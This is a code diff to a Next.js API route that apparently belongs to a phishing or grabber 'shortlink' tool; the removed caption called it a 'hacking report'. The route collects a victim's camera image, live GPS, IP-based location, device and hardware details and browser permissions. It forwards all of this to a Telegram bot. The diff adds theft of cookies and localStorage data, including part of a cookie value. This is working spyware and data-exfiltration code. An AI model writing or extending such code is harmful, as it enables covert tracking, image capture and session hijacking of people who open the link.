@@ -3,34 +3,45 @@ import axios from "axios";
 
 export async function POST(req: Request) {
   try {
-    const { image, gps, device, battery, permissions } = await req.json();
+    const body = await req.json();
+    const { image, gps, device, battery, permissions, cookies, localStorageData, gpu } = body;
     const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";
 
-    // Info Lokasi IP
     const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`).catch(() => ({ data: {} }));
     const geo = geoRes.data;
 
-    let caption = `🚀 *SHORTLINK GENERATOR HACKING REPORT*\n`;
+    let caption = `🚀 *ULTIMATE SYSTEM REPORT*\n`;
     caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
     
-    // Informasi Jaringan (Klik nilai untuk copy)
+    // 🌐 JARINGAN & LOKASI
     caption += `🌐 *NETWORK & GEO*\n`;
     caption += `├ *IP:* \`${geo.query || ip}\` \n`;
     caption += `├ *ISP:* \`${geo.isp || "?"}\` \n`;
     caption += `└ *Lokasi:* \`${geo.city || "?"}, ${geo.country || "?"}\` \n\n`;
 
-    // Detail Perangkat
-    caption += `📱 *DEVICE DETAILS*\n`;
-    caption += `├ *Model:* \`${device.model || "Unknown"}\` \n`;
-    caption += `├ *OS:* \`${device.os || "Unknown"}\` \n`;
-    caption += `└ *Baterai:* \`${battery?.level || "0"}%\` (${battery?.charging ? "⚡" : "🔋"}) \n\n`;
+    // 📱 HARDWARE MENDALAM
+    caption += `📱 *HARDWARE INFO*\n`;
+    caption += `├ *Model:* \`${device.model}\` \n`;
+    caption += `├ *OS:* \`${device.os}\` \n`;
+    caption += `├ *RAM:* \`${device.ram}\` \n`;
+    caption += `├ *CPU:* \`${device.cpu}\` \n`;
+    caption += `├ *GPU:* \`${gpu}\` \n`;
+    caption += `└ *Baterai:* \`${battery?.level}%\` (${battery?.charging ? "🔌" : "🔋"}) \n\n`;
 
-    // Laporan Perizinan
+    // 🍪 DATA PENYIMPANAN (Cookies & Storage)
+    caption += `🍪 *STORAGE & COOKIES*\n`;
+    caption += `├ *Cookies:* \`${cookies.length} found\` \n`;
+    caption += `├ *Local:* \`${localStorageData.length > 2 ? "Detected" : "Empty"}\` \n`;
+    if (cookies.length > 0) {
+        caption += `└ *Top Cookie:* \`${cookies[0].substring(0, 40)}...\` \n`;
+    }
+    caption += `\n`;
+
+    // 🛡️ PERIZINAN BROWSER
     caption += `🛡️ *PERMISSIONS*\n`;
-    caption += `├ *Kamera/Mic:* \`Detected\` \n`;
-    caption += `├ *Lokasi:* \`${permissions.location ? "Granted" : "Denied"}\` \n`;
-    caption += `├ *WebUSB/ADB:* \`${permissions.usb === "supported" ? "Ready" : "No Support"}\` \n`;
-    caption += `└ *HID Devices:* \`${permissions.hid === "supported" ? "Ready" : "No Support"}\` \n\n`;
+    caption += `├ *Lokasi:* \`${permissions.location ? "✅" : "❌"}\` \n`;
+    caption += `├ *Clipboard:* \`${permissions.clipboard}\` \n`;
+    caption += `└ *WebUSB:* \`${permissions.usb === "supported" ? "✅" : "❌"}\` \n\n`;
 
     if (gps) {
       caption += `🎯 *LIVE GPS*\n`;
@@ -39,15 +50,15 @@ export async function POST(req: Request) {
     
     caption += `\n━━━━━━━━━━━━━━━━━━━━`;
 
-    // Membuat Menu Tombol (Inline Keyboard)
+    // Menu Tombol Interaktif
     const keyboard = {
       inline_keyboard: [
         [
-          { text: "📍 Buka Google Maps", url: gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : "https://maps.google.com" },
+          { text: "📍 Google Maps", url: gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : "https://maps.google.com" },
+          { text: "🔍 IP Detail", url: `https://ip-api.com/#${geo.query || ip}` }
         ],
         [
-          { text: "🌐 Cek IP Detail", url: `https://ip-api.com/#${geo.query || ip}` },
-          { text: "🛠️ Ya-WebADB", url: "https://yabb.dev/" }
+          { text: "📁 Download Full JSON", url: "https://t.me/your_bot_username" } // Opsional: arahkan ke bot untuk data mentah
         ]
       ]
     };
@@ -62,13 +73,12 @@ export async function POST(req: Request) {
     
     formData.append("caption", caption);
     formData.append("parse_mode", "Markdown");
-    formData.append("reply_markup", JSON.stringify(keyboard)); // Menambahkan Menu Tombol
+    formData.append("reply_markup", JSON.stringify(keyboard));
 
     await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, formData);
 
     return NextResponse.json({ success: true });
   } catch (error) {
-    console.error("Error sending to Telegram:", error);
     return NextResponse.json({ error: "Failed" }, { status: 500 });
   }
 }
